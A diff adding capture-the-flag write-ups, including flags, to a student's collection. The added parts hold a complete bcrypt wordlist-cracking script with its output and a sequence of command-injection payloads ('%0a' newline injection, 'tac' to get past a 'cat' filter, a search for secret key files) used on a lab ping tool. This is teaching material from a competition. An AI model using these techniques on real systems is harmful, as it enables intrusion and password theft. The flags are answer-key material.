@@ -1,3 +1,7 @@
+# CITADEL WRITEUPS BY ARYAN GUPTA(AKG451)
+
+`-------------------------------------------------------------------------------------------------------------------------------`
+
 # Challenge Name
 Zahard Welcome
 
@@ -12,7 +16,7 @@ Basic Searching Through Discord
 ## References 
 None
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Omniscent Metadata
@@ -31,7 +35,7 @@ How to use Binwalker
 ## References 
 CTF SCHOOL VIDEO: https://youtube.com/shorts/79k8Ps82VaM?si=P_R8a5GROaRn8ZDv
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Taste Of Sweetness
@@ -47,7 +51,7 @@ Cookie editing
 ## References 
 None
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Rotten Apple
@@ -63,7 +67,7 @@ ROT Cipher
 ## References 
 Chatgpt
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Randomly accessed Memory
@@ -86,7 +90,7 @@ Reading the commit history of a repository.
 ## References 
 None
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Robot's trail
@@ -161,7 +165,7 @@ URL manipulation
 ## References 
 Chatgpt
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 schlagenheim
@@ -191,7 +195,7 @@ File repairing using xxd and midi file format
 ## References 
 Gemini AI
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 XOR Slide
@@ -208,7 +212,7 @@ XOR decryption
 ## References 
 Chatgpt and Gemini
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Sound of Music
@@ -225,13 +229,13 @@ OSINT
 ## References 
 Google
 
-
+`-------------------------------------------------------------------------------------------------------------------------------`
 
 # Challenge Name
 Echoes and Pings
 
 ## My solve
-**Flag:** `citadel{7h3_c174d3l_b3ck0n5}`
+**Flag:** `citadel{1_r34lly_w4nt_t0_st4y_4t_y0ur_h0us3}`
 
 1. When i first saw the `pcap` file my first reaction was searching on the internet to understand "how to analyse a pcap file". The first answer was `wireshark` so I installed wireshark and loaded the file into it. Unfortunately I didn't understood anything that was being displayed there.
 2. So it was time to search on youtube for "How to use wireshark to analyse pcap" I have attached the link of the video I used to learn about it plus I also asked AI what can be the process of analysing such files. Chatgpt suggested me to look into "ICMP" that is internet control message protocol since that's what deals with echoes and pings.
@@ -280,3 +284,300 @@ How to use wireshark and ICMP
 yt video: "https://youtu.be/ZNS115MPsO0?si=TkDHZEyhJcw95LdI"
 Chatgpt
 Google
+
+`-------------------------------------------------------------------------------------------------------------------------------`
+
+# Challenge Name
+The Ripper
+
+## My solve
+**Flag:** `citadel{fake_flag_4_fake_pl4y3rs}`
+
+I already knew a little bit about john the ripper so what i did is that i asked chatgpt about how to implement a john the ripper to brute-force passwords and I found we usually need to create a bcrypt file for this purpose. So  I told chatgpt to make a bcrypt file for me and also to explain me how it works. 
+Finally I pasted this command in bash which basically creates a python bcrypt file for me from the terminal itself
+
+```bash
+cat > crack_bcrypt.py <<'PY'
+#!/usr/bin/env python3
+"""
+bcrypt_cracker - fast, practical bcrypt checker for a single hash + a wordlist.
+
+Usage:
+  1. Put your hash in a file called hash.txt (single line).
+  2. Put your wordlist in wordlist.txt (one candidate per line).
+  3. Run: python3 crack_bcrypt.py
+
+Notes:
+ - This script will try:
+    * each line as-is
+    * if a line matches citadel{...}, the inner password (contents between braces)
+    * simple variants: append/prepend digits 0..99 and common suffixes
+ - Uses multiprocessing to use all CPU cores.
+ - Install dependency: pip3 install bcrypt
+ - Output: prints the found password and writes ./found.txt
+"""
+import os
+import sys
+import re
+from multiprocessing import Pool, cpu_count
+
+try:
+    import bcrypt
+except Exception:
+    print("Missing dependency 'bcrypt'. Install it with: pip3 install bcrypt")
+    raise
+
+HASH_FILE = "hash.txt"
+WORDLIST_FILE = "wordlist.txt"
+OUTPUT_FILE = "found.txt"
+
+def load_hash(path=HASH_FILE):
+    if not os.path.isfile(path):
+        print(f"Hash file not found at '{path}'. Create it with the single bcrypt hash on one line.")
+        sys.exit(1)
+    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            s = line.strip()
+            if s:
+                return s.encode()
+    print("No non-empty line found in hash file.")
+    sys.exit(1)
+
+def load_wordlist(path=WORDLIST_FILE):
+    if not os.path.isfile(path):
+        print(f"Wordlist file not found at '{path}'. Provide a wordlist with one entry per line.")
+        sys.exit(1)
+    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+        lines = [line.strip() for line in f if line.strip()]
+    print(f"Loaded {len(lines)} words from {path}")
+    return lines
+
+def generate_variants(entry):
+    entry = entry.strip()
+    variants = set()
+    if not entry:
+        return variants
+
+    variants.add(entry)
+
+    m = re.match(r'citadel\{(.+)\}$', entry, flags=re.I)
+    if m:
+        inner = m.group(1)
+        variants.add(inner)
+        variants.add(f"citadel{{{inner}}}")
+
+    if entry.startswith("{") and entry.endswith("}"):
+        variants.add(entry[1:-1])
+
+    common_suffixes = ["", "123", "!", "2025", "1", "!!", "1234"]
+    for suf in common_suffixes:
+        variants.add(entry + suf)
+        variants.add(suf + entry)
+
+    for d in range(100):
+        s = str(d)
+        variants.add(entry + s)
+        variants.add(s + entry)
+
+    leet_map = (("a","4"),("e","3"),("i","1"),("o","0"),("s","5"),("t","7"))
+    def leet_variants(s):
+        outs = set([s])
+        for orig, sub in leet_map:
+            new = s.replace(orig, sub).replace(orig.upper(), sub)
+            outs.add(new)
+        return outs
+
+    for v in list(variants):
+        for lv in leet_variants(v):
+            variants.add(lv)
+
+    variants = {v for v in variants if 1 <= len(v) <= 120}
+    return variants
+
+def check_candidate(bcrypt_hash, candidate):
+    try:
+        return bcrypt.checkpw(candidate.encode("utf-8"), bcrypt_hash)
+    except Exception:
+        return False
+
+def worker_test(args):
+    bcrypt_hash, candidate = args
+    if check_candidate(bcrypt_hash, candidate):
+        return candidate
+    return None
+
+def main():
+    bcrypt_hash = load_hash()
+    wordlist = load_wordlist()
+    print("Preparing candidates (this may take a moment)...")
+    candidates = []
+    BATCH_SIZE = 20000
+    pool = Pool(processes=max(1, cpu_count() - 0))
+
+    try:
+        for idx, entry in enumerate(wordlist, 1):
+            for cand in generate_variants(entry):
+                candidates.append((bcrypt_hash, cand))
+                if len(candidates) >= BATCH_SIZE:
+                    for res in pool.imap_unordered(worker_test, candidates):
+                        if res:
+                            print("="*60)
+                            print("FOUND PASSWORD:", res)
+                            print("Flag format is: citadel{password}")
+                            with open(OUTPUT_FILE, "w") as out:
+                                out.write(res + "\n")
+                            pool.terminate()
+                            return
+                    candidates = []
+            if idx % 500 == 0:
+                print(f"Processed {idx} base words...")
+
+        if candidates:
+            for res in pool.imap_unordered(worker_test, candidates):
+                if res:
+                    print("="*60)
+                    print("FOUND PASSWORD:", res)
+                    print("Flag format is: citadel{password}")
+                    with open(OUTPUT_FILE, "w") as out:
+                        out.write(res + "\n")
+                    pool.terminate()
+                    return
+
+        print("No match found with current transformation rules.")
+    finally:
+        pool.close()
+        pool.join()
+
+if __name__ == '__main__':
+    main()
+PY
+chmod +x crack_bcrypt.py
+
+```
+After this I just ran `python3 crack_bcrypt.py` and after waiting for some time I got my flag like this:
+
+```bash
+akg451@akg451-OMEN-by-HP-Gaming-Laptop-16-xd0xxx:~/Downloads$ python3 crack_bcrypt.py
+Loaded 70600 words from wordlist.txt
+Preparing candidates (this may take a moment)...
+Processed 500 base words...
+Processed 1000 base words...
+Processed 1500 base words...
+Processed 2000 base words...
+Processed 2500 base words...
+Processed 3000 base words...
+Processed 3500 base words...
+Processed 4000 base words...
+Processed 4500 base words...
+Processed 5000 base words...
+Processed 5500 base words...
+Processed 6000 base words...
+Processed 6500 base words...
+Processed 7000 base words...
+Processed 7500 base words...
+Processed 8000 base words...
+Processed 8500 base words...
+Processed 9000 base words...
+Processed 9500 base words...
+Processed 10000 base words...
+Processed 10500 base words...
+Processed 11000 base words...
+Processed 11500 base words...
+Processed 12000 base words...
+Processed 12500 base words...
+Processed 13000 base words...
+Processed 13500 base words...
+Processed 14000 base words...
+Processed 14500 base words...
+Processed 15000 base words...
+Processed 15500 base words...
+Processed 16000 base words...
+Processed 16500 base words...
+Processed 17000 base words...
+Processed 17500 base words...
+Processed 18000 base words...
+Processed 18500 base words...
+Processed 19000 base words...
+Processed 19500 base words...
+Processed 20000 base words...
+Processed 20500 base words...
+Processed 21000 base words...
+Processed 21500 base words...
+Processed 22000 base words...
+Processed 22500 base words...
+Processed 23000 base words...
+Processed 23500 base words...
+Processed 24000 base words...
+Processed 24500 base words...
+Processed 25000 base words...
+Processed 25500 base words...
+Processed 26000 base words...
+Processed 26500 base words...
+Processed 27000 base words...
+Processed 27500 base words...
+Processed 28000 base words...
+Processed 28500 base words...
+Processed 29000 base words...
+Processed 29500 base words...
+Processed 30000 base words...
+Processed 30500 base words...
+Processed 31000 base words...
+Processed 31500 base words...
+Processed 32000 base words...
+Processed 32500 base words...
+Processed 33000 base words...
+Processed 33500 base words...
+Processed 34000 base words...
+Processed 34500 base words...
+Processed 35000 base words...
+============================================================
+FOUND PASSWORD: fake_flag_4_fake_pl4y3rs
+Flag format is: citadel{password}
+```
+
+## What I learned
+How to use John the ripper and what is a bcrypt file
+
+## References 
+Chatgpt and Google
+
+`-------------------------------------------------------------------------------------------------------------------------------`
+
+# Challenge Name
+AetherCorp NetprobeX
+
+## My solve
+**Flag:** ``
+
+For this challenge my knowledge about linux terminal commands were useful also I took help of Gemini AI for specific syntax to follow and also there were some commands I didn't knew about so in that also gemini AI helped me.Below are attached screenshots of how I solved the question but before going with this approach I did go on a tangent and tried searching through inspect element,cookies and other similar stuff thinking this challenge may have some clues hidden there. 
+
+How I solved it:
+
+`8.8.8.8 ; ls` I am trying to execute ls command to see all the files available on the system
+![Alt text](images/aether1.png "")
+
+`8.8.8.8 | ls` Since `;` didn't work I decided to try piping but that was also blocked
+![Alt text](images/aether2.png "")
+
+`8.8.8.8 && ls` I decided to use `&&` but that didn't work either
+![Alt text](images/aether3.png "")
+
+`8.8.8.8%0als` This command was new for me and fortunately it worked and I got to know the exact content stored in the website
+![Alt text](images/aether4.png "")
+
+`8.8.8.8%0acat mission_briefing.txt` I tried this to read into `mission_briefing` but since cat wasn't allowed the command didn't work
+![Alt text](images/aether5.png "")
+
+`8.8.8.8%0atac mission_briefing.txt` I decided to use an alternative to `cat` that is `tac` and got the below result 
+![Alt text](images/aether6.png "")
+
+`8.8.8.8%0afind / -iname "*blacksite*key*" 2>/dev/null` since it told me to search for blacksite key I did exactly that to achieve the desired result 
+![Alt text](images/aether7.png "")
+
+`8.8.8.8%0atac /var/lib/aethercorp/archive/.secrets/blacksite_key.dat` finally after knowing the exact location of the key I got the flag by running this command
+![Alt text](images/aether8.png "")
+## What I learned
+`tac`, `%0als` and some other commands along with learning new ways to implement existing commands
+
+## References 
+Gemini AI
